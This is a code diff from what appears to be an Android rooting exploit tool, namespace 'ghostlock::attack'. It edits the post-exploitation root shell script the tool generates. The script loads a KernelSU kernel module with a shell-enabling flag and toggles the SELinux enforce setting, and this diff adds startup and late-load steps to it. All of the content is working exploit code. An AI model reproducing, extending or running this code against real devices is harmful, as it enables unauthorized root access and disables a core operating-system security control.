@@ -7,6 +7,7 @@
  */
 
 #include "attack/ops.hpp"
+#include "attack/ksu_startup_script.hpp"
 #include "support/fatal_error.hpp"
 
 #include "session/exploit_session.hpp"
@@ -239,6 +240,7 @@ namespace ghostlock::attack {
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
+            "%s\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
@@ -391,8 +393,7 @@ namespace ghostlock::attack {
             "  fi\n"
             "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
             "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+            "  run_late_load || exit 1\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
             "KSU_READY=0\n"
@@ -409,12 +410,14 @@ namespace ghostlock::attack {
             "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
             "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
             "fi\n"
+            "complete_ksu_startup\n"
             "else\n"
             "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
             "fi\n",
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
+            kKsuStartupScript,
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
